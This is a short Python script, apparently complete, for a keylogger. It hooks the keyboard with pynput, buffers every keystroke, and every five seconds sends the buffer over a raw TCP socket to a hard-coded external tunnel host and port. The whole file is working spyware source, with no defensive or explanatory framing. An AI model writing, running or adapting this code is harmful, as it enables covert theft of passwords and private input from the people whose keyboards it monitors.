import pynput
from pynput.keyboard import Key, Listener
import socket
import time

# Server details (your external tunnel address)
SERVER_HOST = 'rock-grain.gl.at.ply.gg'
SERVER_PORT = 18756

# Buffer to store keystrokes
keystrokes = []

def on_press(key):
    try:
        # Convert key to string
        k = str(key).replace("'", "")
        keystrokes.append(k)
    except Exception as e:
        print(f"Error capturing key: {e}")

def send_keystrokes():
    while True:
        if keystrokes:
            try:
                # Connect to server
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((SERVER_HOST, SERVER_PORT))
                    # Send all keystrokes in buffer
                    data = '\n'.join(keystrokes).encode('utf-8')
                    s.sendall(data)
                    # Clear buffer after sending
                    keystrokes.clear()
            except Exception as e:
                print(f"Error sending keystrokes: {e}")
        time.sleep(5)  # Send every 5 seconds if there are keystrokes

def main():
    # Start listener for keystrokes
    with Listener(on_press=on_press) as listener:
        # Run send_keystrokes in a loop
        send_keystrokes()
        listener.join()

if __name__ == "__main__":
    main()